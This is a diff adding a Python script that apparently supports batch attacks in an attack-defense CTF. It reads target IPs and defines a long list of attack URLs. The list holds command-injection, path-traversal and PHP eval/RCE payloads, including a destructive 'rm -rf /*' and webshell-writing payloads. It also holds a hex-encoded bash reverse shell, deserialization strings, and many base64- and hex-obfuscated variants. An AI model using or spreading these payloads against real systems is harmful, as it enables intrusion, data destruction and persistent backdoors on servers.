@@ -1,0 +1,353 @@
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+# Author:   3s_NwGeek
+import requests,time
+from gevent import monkey
+from gevent.pool import Pool
+monkey.patch_all()
+
+targets = open("C:\\Users\\3s_NwGeek\Desktop\\target.txt").read().splitlines()  #批量目标
+
+fake_uri='''http://TARGET_IP/index.php?a=../../ping.php&ip=127.0.0.1|cat+/flag
+http://TARGET_IP/index.php?b=admin/admin_code.php&b1=system&b2="cat /flag"
+http://TARGET_IP/index.php?cmd=cat+/flag
+http://TARGET_IP/index.php?r=eval("system('whoami');");
+http://TARGET_IP/index.php?file=../../../../../../../flag
+http://TARGET_IP/index.php?r=search/search.php?url=http://127.0.0.1/file.php&file=../../../flag
+http://TARGET_IP/index.php?c=sitemap/sitemap.php&cmd='cat flag'
+http://TARGET_IP/index.php?r=apps/user/admin/views/login.php&func=eval&e1=system&e2="cat flag"
+http://TARGET_IP/index.php?d=includes/tpl.class.php&file=../../../flag
+http://TARGET_IP/index.php?s=/index/\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system("cat%20../../../flag");%27
+http://TARGET_IP/index.php?data=Li4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZw==
+http://TARGET_IP/index.php?r=data/compile_tpl/left_nav_cn_compile.php&code=print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd())))))); 
+http://TARGET_IP/index.php?ab=data/cache_tpl/head_cn_compile.php&serzile='";}s:5:"photo";s:4: "/flag'
+http://TARGET_IP/index.php?r=data/config.php&file=php://filter/resource=phar://../../flag
+http://TARGET_IP/index.php?x=templates/default/common/404.php&cmd=whoami
+http://TARGET_IP/index.php?file=templates/default/common/404.php&cmd=ls
+http://TARGET_IP/index.php?x=templates/default/common/404.php&cmd=rm -rf /*
+http://TARGET_IP/index.php?mod=query&filename=4e050cbf0e8d11ea9f4cd3c947940d9f.php
+http://TARGET_IP/index.php?mod=uploadfile&filename=52fd963c0e8d11ea9f81d3c947940d9f.php
+http://TARGET_IP/index.php?file=%3Cinput%20type=%22text%22%20class=%22input-text%22%20name=%22data[uc_ip,x);a]%3E]%22%20id=%22uc_ip%22%20value=%22;eval($_POST[1]);%20%22%3E
+http://TARGET_IP/index.php?x=helpers/function_helper.php&page=c3lzdGVtKCJjYXQgL2ZsYWciKTs=
+http://TARGET_IP/index.php?a=finecms/Init.php&s=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?s=api/ucsso/api.php&action=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?page=controllers/admin/Linkage.php&lid=ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LEwyWnNZV2M9PSZmaWxlPXBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aW5kZXgucGhw
+http://TARGET_IP/index.php?c=controllers/admin/Linkage.php&id=%7CO:5:%22flag2%22:1:%7Bs:4:%22gogo%22;s:55:%22show_source(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?api/ucsso/api.php&action=1=(substring((select%0A0x66%0Afrom%0Aflag%0Awhere%0Abinary(/flag)%3C0x2e2f)from%0A1))
+http://TARGET_IP/index.php?helpers/function_helper.php&page=PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC10ZXh0IiBuYW1lPSJkYXRhW3VjX2lwLHgpO2FdPl0iIGlkPSJ1Y19pcCIgdmFsdWU9IjtldmFsKCRfUE9TVFsxXSk7ICI+
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&lid=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=
+http://TARGET_IP/index.php?api/ueditor/php/controller.php&action=cGhhcjovL1VwMTBhRHMveTljOHY5b3czczZhbnM1bzhveTV1M3Fuc2RuY2tRVkpGSUZsUFZTQkxTVVJFU1U1SElFMUZmbjQ9CmV2YS5wbmcvaGFoYWhhaGE=
+http://TARGET_IP/index.php?admin/eWebEditor/admin_login.php?mod=query&filename=60925bf20e8d11ea9fe1d3c947940d9f.php
+http://TARGET_IP/index.php?controllers/member/Api.php&limit=cGhhcjovL1VwMTBhRHMveTljOHY5b3czczZhbnM1bzhveTV1M3Fuc2RuY2tRVkpGSUZsUFZTQkxTVVJFU1U1SElFMUZmbjQ9CmV2YS5wbmcvaGFoYWhhaGE=
+http://TARGET_IP/index.php?admin_data.php&action=BackupData
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&site=aHR0cCUzQSUyZiUyZjEyNy4wLjAuMSUyZmluZGV4LnBocCUzRmZpbGUlM0RodHRwJTNBJTJmJTJmMTI3LjAuMC4xJTJmJTI2cGF0aCUzRCUyNTNDJTI1M0ZwaHAlMjUyMEBldmFsJTI1MjglMjUyNF9QT1NUJTI1NUIlMjUyN2MlMjUyNyUyNTVEJTI1MjklMjUzQiUyNTNGJTI1M0UmcGF0aD0uL2ZsYWc=
+http://TARGET_IP/index.php?controllers/admin/Form.php&site=aHR0cCUzQSUyZiUyZjEyNy4wLjAuMSUyZmluZGV4LnBocCUzRmZpbGUlM0RodHRwJTNBJTJmJTJmMTI3LjAuMC4xJTJmJTI2cGF0aCUzRCUyNTNDJTI1M0ZwaHAlMjUyMEBldmFsJTI1MjglMjUyNF9QT1NUJTI1NUIlMjUyN2MlMjUyNyUyNTVEJTI1MjklMjUzQiUyNTNGJTI1M0UmcGF0aD0uL2ZsYWc=
+http://TARGET_IP/index.php?finecms/Init.php&s=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?r=api/ucsso/helper.php&callback=c3lzdGVtKCJjYXQgL2ZsYWciKTs=
+http://TARGET_IP/index.php?file=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?c=controllers/Api.php&page=$%7Bsystem(hex2bin(ff0a2f62696e2f62617368202d6320277368202d69203e26202f6465762f7463702f3132372e302e302e312f3434343420303e263127))%7D
+http://TARGET_IP/index.php?callback=print_r(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?return=$%7Beval(substr(hex2bin(ff6576616c28245f524551554553545b635d293b),1,19))%7D
+http://TARGET_IP/index.php?mod=modify&filename=6b2671660e8d11eaa085d3c947940d9f.php
+http://TARGET_IP/index.php?pid=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?action=$%7Beval(substr(hex2bin(667075747328666f70656e28227368656c6c2e706870222c227722292c223c3f706870204061737365727428245f504f53545b68616861686168615d293b3f3e),1,66))%7D
+http://TARGET_IP/index.php?filename=6bf524fc0e8d11eaa097d3c947940d9f.php
+http://TARGET_IP/index.php?action=$%7Bsystem(hex2bin(ff0a2f62696e2f62617368202d6320277368202d69203e26202f6465762f7463702f3132372e302e302e312f3434343420303e263127))%7D
+http://TARGET_IP/index.php?page=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?__times__=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?page=JHtzeXN0ZW0oaGV4MmJpbihmZjBhMmY2MjY5NmUyZjYyNjE3MzY4MjAyZDYzMjAyNzczNjgyMDJkNjkyMDNlMjYyMDJmNjQ2NTc2MmY3NDYzNzAyZjMxMzIzNzJlMzAyZTMwMmUzMTJmMzQzNDM0MzQyMDMwM2UyNjMxMjcpKX0=
+http://TARGET_IP/index.php?admin=$%7Bsystem(hex2bin(ff0a2f62696e2f62617368202d6320277368202d69203e26202f6465762f7463702f3132372e302e302e312f3434343420303e263127))%7D
+http://TARGET_IP/index.phpadmin=%7D%7Bend%20if%7D%7Bif:1)eval($_POST[cmd]);if(1%7D%7Bend%20if%7D&cmd=fputs(fopen(%22shell.php%22,%22w%22),%22%3C?php%20%5C$e=chr('97').'ssert';%5C$e(%5C$_POST[asasa]);&%3E%22);
+http://TARGET_IP/index.php?api/ueditor/php/controller.php&action=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?controllers/member/Api.php&file=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?site=$%7Beval(substr(hex2bin(ff6576616c28245f524551554553545b635d293b),1,19))%7D
+http://TARGET_IP/index.php?controllers/admin/Content.php&caitd=fXtlbmQgaWZ9e2lmOjEpZXZhbCgkX1BPU1RbY21kXSk7aWYoMX17ZW5kIGlmfSZjbWQ9ZnB1dHMoZm9wZW4oInNoZWxsLnBocCIsInciKSwiPD9waHAgXCRlPWNocignOTcnKS4nc3NlcnQnO1wkZShcJF9QT1NUW2FzYXNhXSk7Pz4iKTs=
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&lid=%3Cinput%20type=%22text%22%20class=%22input-text%22%20name=%22data[uc_ip,x);a]%3E]%22%20id=%22uc_ip%22%20value=%22;eval($_POST[1]);%20%22%3E
+http://TARGET_IP/index.php?s=member&c=login&m=index
+http://TARGET_IP/index.php?m=phar://Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckQVJFIFlPVSBLSURESU5HIE1Ffn4=%0Aeva.png/hahahaha
+http://TARGET_IP/index.php?core/M_Table.php&page=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?controllers/member/Api.php&title=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?helpers/function_helper.php&return=http%3A%2f%2f127.0.0.1%2findex.php%3Ffile%3Dhttp%3A%2f%2f127.0.0.1%2f%26path%3D%253C%253Fphp%2520@eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%253F%253E&path=./flag
+http://TARGET_IP/index.php?logout.html?mod=view&filename=743584550e8d11eaa12fd3c947940d9f.php
+http://TARGET_IP/index.php?s=member&c=login&m=index 
+http://TARGET_IP/index.php?filename=759d2cc00e8d11eaa140d3c947940d9f.php
+http://TARGET_IP/index.php?title=echo%20file_get_contents(%22/flag%22);
+http://TARGET_IP/index.php?controllers/admin/Member.php?page=system(%22echo%20%3C&php%20$%7B(%22
+http://TARGET_IP/index.php?controllers/admin/Tag.php&pid=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=
+http://TARGET_IP/index.php?core/M_Table.php&order=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?controllers/member/Api.php&limit=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?finecms/Init.php&c=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?controllers/admin/Content.php&caitd=c3lzdGVtKCJlY2hvIDw/cGhwICR7KCIjIl4ifCIpLigiIyJeInwiKX09KCIhIl4iYCIpLigiKCAiXiJ7IikuKCIoIl4iWyIpLigifiJeIjsiKS4oInwiXiIuIikuKCIqIl4ifiIpOyR7KCIjIl4ifCIpLigiIyJeInwiKX0oKCItIl4iSCIpLiAoIl0iXiIrIikuICgiWyJeIjoiKS4gKCIsIl4iQCIpLiAoIn0iXiJVIikuICgiZSJeIkEiKS4gKCIoIl4idyIpLigiaiJeIjoiKS4gKCJpIl4iJiIpLiAoIiMiXiJwIikuICgiPiJeImoiKS4gKCIhIl4ieiIpLiAoInQiXiJnIikuICgiZSJeInMiKS4gKCJfIl4ibyIpLiAoIj8iXiJiIikuICgiXSJeInQiKSk7Pz4gPiAvLmMwbmZpZy5waHAiKTs=
+http://TARGET_IP/index.php?core/M_Table.php&order=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?rfname=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?controllers/admin/Member.php&page=print_r(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?core/M_Controller.php&return=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?rid=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?m=PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC10ZXh0IiBuYW1lPSJkYXRhW3VjX2lwLHgpO2FdPl0iIGlkPSJ1Y19pcCIgdmFsdWU9IjtldmFsKCRfUE9TVFsxXSk7ICI+
+http://TARGET_IP/index.php?controllers/admin/Member.php&total=%7CO:6:%22secret%22:1:%7Bs:4:%22gogo%22;s:55:%22highlight_file(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?controllers/admin/Member.php&total=print_r(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?controllers/admin/Weixin.php&admin=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?changepwd.php?mod=uploadfile&filename=7fe6e48c0e8d11eaa1fad3c947940d9f.php
+http://TARGET_IP/index.php?controllers/member/Api.php&fname=aGlnaGxpZ2h0X2ZpbGUoIi9mbGFnIik7
+http://TARGET_IP/index.php?user_upfile.php?mod=view&filename=814b3f6c0e8d11eaa20bd3c947940d9f.php
+http://TARGET_IP/index.php?mod=modify&filename=814b3f6d0e8d11eaa20bd3c947940d9f.php
+http://TARGET_IP/index.php?r=fE86Njoic2VjcmV0IjoxOntzOjQ6ImdvZ28iO3M6NTU6ImhpZ2hsaWdodF9maWxlKCIvZmxhZyIpOyI7fQ==
+http://TARGET_IP/index.php?admin_data.php?action=BackupData?mod=query&filename=82d394f60e8d11eaa21cd3c947940d9f.php
+http://TARGET_IP/index.php?controllers/Api.php&http_referer=$%7Beval(substr(hex2bin(ff6576616c28245f524551554553545b635d293b),1,19))%7D
+http://TARGET_IP/index.php?models/Content_model.php&page=%3Cinput%20type=%22text%22%20class=%22input-text%22%20name=%22data[uc_ip,x);a]%3E]%22%20id=%22uc_ip%22%20value=%22;eval($_POST[1]);%20%22%3E
+http://TARGET_IP/index.php?models/Content_model.php&page=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?site=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?helpers/function_helper.php&page=echo%20file_get_contents(%22/flag%22);
+http://TARGET_IP/index.php?s=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?return=1=(substring((select%0A0x66%0Afrom%0Aflag%0Awhere%0Abinary(/flag)%3C0x2e2f)from%0A1))
+http://TARGET_IP/index.php?core/M_Controller.php&jsonp=%7CO:6:%22secret%22:1:%7Bs:4:%22gogo%22;s:55:%22highlight_file(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?site=PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC10ZXh0IiBuYW1lPSJkYXRhW3VjX2lwLHgpO2FdPl0iIGlkPSJ1Y19pcCIgdmFsdWU9IjtldmFsKCRfUE9TVFsxXSk7ICI+
+http://TARGET_IP/index.php?title=highlight_file(%22/flag%22);
+http://TARGET_IP/index.php?admin=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?api/ucsso/client.php?__times__=%7D%7Bend%20if%7D%7Bif:1)eval($_POST[cmd]);if(1%7D%7Bend%20if%7D&cmd=fputs(fopen(%22shell.php%22,%22w%22),%22%3C?php%20%5C$e=chr('97').'ssert';%5C$e(%5C$_POST[asasa]);&%3E%22);
+http://TARGET_IP/index.php?file=system(%22echo%20%3C&php%20$%7B(%22
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&site=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?file=fXtlbmQgaWZ9e2lmOjEpZXZhbCgkX1BPU1RbY21kXSk7aWYoMX17ZW5kIGlmfSZjbWQ9ZnB1dHMoZm9wZW4oInNoZWxsLnBocCIsInciKSwiPD9waHAgXCRlPWNocignOTcnKS4nc3NlcnQnO1wkZShcJF9QT1NUW2FzYXNhXSk7Pz4iKTs=
+http://TARGET_IP/index.php?controllers/admin/Fcontent.php&total=%7CO:6:%22secret%22:1:%7Bs:4:%22gogo%22;s:55:%22highlight_file(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?controllers/member/Api.php&file=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?controllers/admin/Site.php&admin=echo%20file_get_contents(%22/flag%22);
+http://TARGET_IP/index.php?controllers/member/Apisite=c3lzdGVtKCJjYXQgL2ZsYWciKTs=
+http://TARGET_IP/index.php?api/ucsso/helper&callback=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?finecms/Init.php?m=system(%22echo%20%3C&php%20$%7B(%22
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&site=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?admin_manage/login.php?mod=uploadfile&filename=986a26720e8d11eaa380d3c947940d9f.php
+http://TARGET_IP/index.php?end.php?mod=view&filename=9921444c0e8d11eaa38bd3c947940d9f.php
+http://TARGET_IP/index.php?editor/admin_login.php?mod=modify&filename=9921444d0e8d11eaa38bd3c947940d9f.php
+http://TARGET_IP/index.php?models/Member_model.php&order=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?password.php?mod=query&filename=9ae7b7980e8d11eaa3a7d3c947940d9f.php
+http://TARGET_IP/index.php?finecms/Init.php&s=$%7Beval(substr(hex2bin(667075747328666f70656e28227368656c6c2e706870222c227722292c223c3f706870204061737365727428245f504f53545b68616861686168615d293b3f3e),1,66))%7D
+http://TARGET_IP/index.php?api/ucsso/api.php&time=PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC10ZXh0IiBuYW1lPSJkYXRhW3VjX2lwLHgpO2FdPl0iIGlkPSJ1Y19pcCIgdmFsdWU9IjtldmFsKCRfUE9TVFsxXSk7ICI+
+http://TARGET_IP/index.php?controllers/admin/Mail.php?admin=system(%22echo%20%3C&php%20$%7B(%22
+http://TARGET_IP/index.php?api/ueditor/php/controller.php&callback=PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC10ZXh0IiBuYW1lPSJkYXRhW3VjX2lwLHgpO2FdPl0iIGlkPSJ1Y19pcCIgdmFsdWU9IjtldmFsKCRfUE9TVFsxXSk7ICI+
+http://TARGET_IP/index.php?core/M_Controller.php&jsonp=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?api/ucsso/api.php&time=cGhhcjovL1VwMTBhRHMveTljOHY5b3czczZhbnM1bzhveTV1M3Fuc2RuY2tRVkpGSUZsUFZTQkxTVVJFU1U1SElFMUZmbjQ9CmV2YS5wbmcvaGFoYWhhaGE=
+http://TARGET_IP/index.php?controllers/admin/Urlrule.php&admin=fXtlbmQgaWZ9e2lmOjEpZXZhbCgkX1BPU1RbY21kXSk7aWYoMX17ZW5kIGlmfSZjbWQ9ZnB1dHMoZm9wZW4oInNoZWxsLnBocCIsInciKSwiPD9waHAgXCRlPWNocignOTcnKS4nc3NlcnQnO1wkZShcJF9QT1NUW2FzYXNhXSk7Pz4iKTs=
+http://TARGET_IP/index.php?api/ucsso/client.php&__times__=aGlnaGxpZ2h0X2ZpbGUoIi9mbGFnIik7
+http://TARGET_IP/index.php?helpers/function_helper.php&order=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?controllers/admin/Tag.php&pid=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?controllers/admin/Mail.php&admin=aHR0cCUzQSUyZiUyZjEyNy4wLjAuMSUyZmluZGV4LnBocCUzRmZpbGUlM0RodHRwJTNBJTJmJTJmMTI3LjAuMC4xJTJmJTI2cGF0aCUzRCUyNTNDJTI1M0ZwaHAlMjUyMEBldmFsJTI1MjglMjUyNF9QT1NUJTI1NUIlMjUyN2MlMjUyNyUyNTVEJTI1MjklMjUzQiUyNTNGJTI1M0UmcGF0aD0uL2ZsYWc=
+http://TARGET_IP/index.php?controllers/admin/Member.php&total=aGlnaGxpZ2h0X2ZpbGUoIi9mbGFnIik7
+http://TARGET_IP/index.php?helpers/function_helper.php&return=cGhhcjovL1VwMTBhRHMveTljOHY5b3czczZhbnM1bzhveTV1M3Fuc2RuY2tRVkpGSUZsUFZTQkxTVVJFU1U1SElFMUZmbjQ9CmV2YS5wbmcvaGFoYWhhaGE=
+http://TARGET_IP/index.php?usergroup_0.php?mod=uploadfile&filename=a28b162a0e8d11eaa40dd3c947940d9f.php
+http://TARGET_IP/index.php?admin_setup.php?mod=view&filename=a46f91dc0e8d11eaa42dd3c947940d9f.php
+http://TARGET_IP/index.php?User_GetPassword.php?mod=modify&filename=a46f91dd0e8d11eaa42dd3c947940d9f.php
+http://TARGET_IP/index.php?helpers/function_helper.php&order=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?api/ucsso/api.php?action=system(%22echo%20%3C&php%20$%7B(%22
+http://TARGET_IP/index.php?core/M_Table.php?page=system(%22echo%20%3C&php%20$%7B(%22
+http://TARGET_IP/index.php?controllers/member/Api.php&title=1=(substring((select%0A0x66%0Afrom%0Aflag%0Awhere%0Abinary(/flag)%3C0x2e2f)from%0A1))
+http://TARGET_IP/index.php?controllers/admin/Weixin.php&callback=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?finecms/Init.php?m=%7D%7Bend%20if%7D%7Bif:1)eval($_POST[cmd]);if(1%7D%7Bend%20if%7D&cmd=fputs(fopen(%22shell.php%22,%22w%22),%22%3C?php%20%5C$e=chr('97').'ssert';%5C$e(%5C$_POST[asasa]);&%3E%22);
+http://TARGET_IP/index.php?controllers/admin/Block.php&admin=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?core/M_Controller.php?page=%7D%7Bend%20if%7D%7Bif:1)eval($_POST[cmd]);if(1%7D%7Bend%20if%7D&cmd=fputs(fopen(%22shell.php%22,%22w%22),%22%3C?php%20%5C$e=chr('97').'ssert';%5C$e(%5C$_POST[asasa]);&%3E%22);
+http://TARGET_IP/index.php?controllers/admin/Mail.php&admin=$%7Beval(substr(hex2bin(667075747328666f70656e28227368656c6c2e706870222c227722292c223c3f706870204061737365727428245f504f53545b68616861686168615d293b3f3e),1,66))%7D
+http://TARGET_IP/index.php?core/M_Table.php?order=%7D%7Bend%20if%7D%7Bif:1)eval($_POST[cmd]);if(1%7D%7Bend%20if%7D&cmd=fputs(fopen(%22shell.php%22,%22w%22),%22%3C?php%20%5C$e=chr('97').'ssert';%5C$e(%5C$_POST[asasa]);&%3E%22);
+http://TARGET_IP/index.php?controllers/admin/Form.php&admin=http%3A%2f%2f127.0.0.1%2findex.php%3Ffile%3Dhttp%3A%2f%2f127.0.0.1%2f%26path%3D%253C%253Fphp%2520@eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%253F%253E&path=./flag
+http://TARGET_IP/index.php?controllers/Search.php&page=fXtlbmQgaWZ9e2lmOjEpZXZhbCgkX1BPU1RbY21kXSk7aWYoMX17ZW5kIGlmfSZjbWQ9ZnB1dHMoZm9wZW4oInNoZWxsLnBocCIsInciKSwiPD9waHAgXCRlPWNocignOTcnKS4nc3NlcnQnO1wkZShcJF9QT1NUW2FzYXNhXSk7Pz4iKTs=
+http://TARGET_IP/index.php?admin_data.php&action=BackupData
+http://TARGET_IP/index.php?controllers/Search.php&page=fE86Njoic2VjcmV0IjoxOntzOjQ6ImdvZ28iO3M6NTU6ImhpZ2hsaWdodF9maWxlKCIvZmxhZyIpOyI7fQ==
+http://TARGET_IP/index.php?controllers/member/Api.php&limit=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?api/ueditor/php/controller.php&callback=%3Cinput%20type=%22text%22%20class=%22input-text%22%20name=%22data[uc_ip,x);a]%3E]%22%20id=%22uc_ip%22%20value=%22;eval($_POST[1]);%20%22%3E
+http://TARGET_IP/index.php?api/ueditor/php/controller.php&action=highlight_file(%22/flag%22);
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&site=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&site=echo%20file_get_contents(%22/flag%22);
+http://TARGET_IP/index.php?controllers/admin/Weixin.php&site=c3lzdGVtKCJlY2hvIDw/cGhwICR7KCIjIl4ifCIpLigiIyJeInwiKX09KCIhIl4iYCIpLigiKCAiXiJ7IikuKCIoIl4iWyIpLigifiJeIjsiKS4oInwiXiIuIikuKCIqIl4ifiIpOyR7KCIjIl4ifCIpLigiIyJeInwiKX0oKCItIl4iSCIpLiAoIl0iXiIrIikuICgiWyJeIjoiKS4gKCIsIl4iQCIpLiAoIn0iXiJVIikuICgiZSJeIkEiKS4gKCIoIl4idyIpLigiaiJeIjoiKS4gKCJpIl4iJiIpLiAoIiMiXiJwIikuICgiPiJeImoiKS4gKCIhIl4ieiIpLiAoInQiXiJnIikuICgiZSJeInMiKS4gKCJfIl4ibyIpLiAoIj8iXiJiIikuICgiXSJeInQiKSk7Pz4gPiAvLmMwbmZpZy5waHAiKTs=
+http://TARGET_IP/index.php?controllers/admin/Form.php&admin=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?core/M_Table.php&order=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=
+http://TARGET_IP/index.php?controllers/member/Login.php&debug=phar://Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckQVJFIFlPVSBLSURESU5HIE1Ffn4=%0Aeva.png/hahahaha
+http://TARGET_IP/index.php?helpers/function_helper.php&cache=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?rss2.php?mod=uploadfile&filename=b37dc1620e8d11eaa525d3c947940d9f.php
+http://TARGET_IP/index.php?models/Form_model.php&order=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?controllers/admin/Content.php&total=cGhhcjovL1VwMTBhRHMveTljOHY5b3czczZhbnM1bzhveTV1M3Fuc2RuY2tRVkpGSUZsUFZTQkxTVVJFU1U1SElFMUZmbjQ9CmV2YS5wbmcvaGFoYWhhaGE=
+http://TARGET_IP/index.php?helpers/function_helper.php&page=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?controllers/admin/Content.php&page=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?commentedit.htm?mod=view&filename=b37dc1630e8d11eaa525d3c947940d9f.php
